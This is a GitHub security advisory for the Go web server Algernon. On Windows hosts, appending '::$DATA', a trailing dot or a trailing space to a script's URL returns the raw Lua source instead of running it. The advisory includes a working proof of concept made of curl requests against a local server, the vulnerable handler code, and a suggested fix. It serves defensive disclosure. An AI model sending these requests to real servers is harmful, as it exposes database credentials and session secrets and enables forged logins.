# [H] Algernon vulnerable to server-side script source disclosure on Windows via NTFS filename

## Summary
Severity: High
Advisory: GHSA-mm6c-5j6x-hq8m
CVE: CVE-2026-52792
CWE: CWE-69
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-02
Source: https://github.com/advisories/GHSA-mm6c-5j6x-hq8m
Type: github-advisory

## Affected
- Go: `github.com/xyproto/algernon` — affected >=0 <1.17.9

## Details
### Summary

Algernon selects its file handler from `filepath.Ext()` (engine/handlers.go:134), which does not treat the NTFS-equivalent names `x.lua::$DATA`, `x.lua.`, or `x.lua ` as `.lua`. On Windows, an unauthenticated client appends one of these suffixes to any server-side script on a public path and receives its raw source instead of executed output, leaking embedded secrets such as database credentials and the `SetCookieSecret` value.

Linux and macOS hosts are unaffected.

### Preconditions

- Algernon runs on a Windows host (NTFS filesystem).
- The instance serves at least one server-side script (`.lua`, `.tl`, `.po2`, `.amber`, `.frm`).
- The script sits on a public path, or no auth backend is configured (`--nodb`, `--simple`, or default no-DB).
- HTTP/HTTPS reachability to the server.

### Details

```go
// engine/handlers.go:133
lowercaseFilename := strings.ToLower(filename)
ext := filepath.Ext(lowercaseFilename) // "index.lua::$data" -> ".lua::$data", not ".lua"  [offending]
...
if ac.dispatchRenderer(w, req, filename, ext) { // ext unrecognised, returns false
    return
}
switch ext {
case ".lua", ".tl": // execute the script -- never reached for the equivalent forms
    // ... RunLua ...
default:
    // control reaches the raw-file branch below
}
```

```go
// engine/handlers.go:452
f, err := os.Open(filename) // NTFS resolves "index.lua::$DATA" to index.lua's data stream
...
// engine/handlers.go:479
if dataBlock, err := ac.ReadAndLogErrors(w, filename, ext); err == nil {
    dataBlock.ToClient(w, req, filename, ac.ClientCanGzip(req), gzipThreshold) // raw source to client
}
```

The request path reaches `FilePage` through `URL2filename` (utils/files.go:24), which rejects only `..`; a `:`, a trailing `.`, and a trailing space all pass through into `filename`. `filepath.Ext` does an exact suffix match, so `.lua::$data`, `.`, and `.lua ` are not equal to `.lua` or `.tl`. The renderer registry and the execute case are both skipped and control falls to the `default` branch.

The default branch opens `filename` with `os.Open` and streams the bytes verbatim. On Windows, NTFS canonicalises the alternate-data-stream suffix `::$DATA`, a trailing dot, and a trailing space back to the underlying file, so the bytes returned are the real script source. The missing check: Algernon never rejects or canonicalises Windows-equivalent filenames before choosing a handler.

### Proof of concept

**Setup**

1. Build Algernon from source on a Windows host:

   ```powershell
   git clone https://github.com/xyproto/algernon
   cd algernon
   git checkout v1.17.8
   go build -o algernon.exe .
   ```

2. Create a web root with a script that embeds secrets, exactly as a real handler would:

   ```powershell
   New-Item -ItemType Directory webroot | Out-Null
   Set-Content webroot\index.lua @'
   -- db = POSTGRES("postgres://app:S3cr3t@db/prod")
   SetCookieSecret("hardcoded-session-key")
   print("<h1>hello</h1>")
   '@
   ```

3. Serve the directory over plain HTTP with no auth backend (run in its own window):

   ```powershell
   .\algernon.exe --httponly --noninteractive --nodb --addr ':8088' --dir .\webroot
   ```

**Exploit**

1. Request the script normally. It executes, and the source is not disclosed:

   ```powershell
   curl.exe -s http://127.0.0.1:8088/index.lua
   ```

   Expected: `<h1>hello</h1>`. The DSN and cookie secret are absent from the response.

2. Request the same script through its NTFS `::$DATA` stream. Algernon returns the raw source:

   ```powershell
   curl.exe -s --path-as-is 'http://127.0.0.1:8088/index.lua::$DATA'
   ```

   Expected: HTTP 200, `Content-Type: application/octet-stream`, body is the verbatim Lua source including `SetCookieSecret("hardcoded-session-key")` and the Postgres DSN.

3. The trailing-dot and trailing-space forms leak the same source:

   ```powershell
   curl.exe -s --path-as-is 'http://127.0.0.1:8088/index.lua.'
   curl.exe -s --path-as-is 'http://127.0.0.1:8088/index.lua%20'
   ```

   Expected: identical raw-source response for both.

### Impact

- **Confidentiality:** Reads the verbatim source of any public-path server-side script, exposing hardcoded DB credentials, API keys, and `SetCookieSecret(...)` values.
- **Authentication:** A disclosed `SetCookieSecret` value lets an unauthenticated attacker forge session cookies and log in as any user.

### Suggestions to fix

> _This has not been tested - it is illustrative only._

Reject request paths whose final segment uses a Windows-equivalent form (alternate data stream, trailing dot, or trailing space) before extension dispatch.

```diff
 func (ac *Config) FilePage(w http.ResponseWriter, req *http.Request, filename, luaDataFilename string) {
+	// Reject Windows filename-equivalent forms that alias a different file
+	// than filepath.Ext sees (e.g. "x.lua::$DATA", "x.lua.", "x.lua ").
+	if base := filepath.Base(filename); strings.ContainsRune(base, ':') ||
+		strings.HasSuffix(base, ".") || strings.HasSuffix(base, " ") {
+		http.NotFound(w, req)
+		return
+	}
 	if ac.quitAfterFirstRequest {
 		go ac.quitSoon("Quit after first request", defaultSoonDuration)
 	}
```

## References
- https://github.com/xyproto/algernon/security/advisories/GHSA-mm6c-5j6x-hq8m
- https://github.com/xyproto/algernon
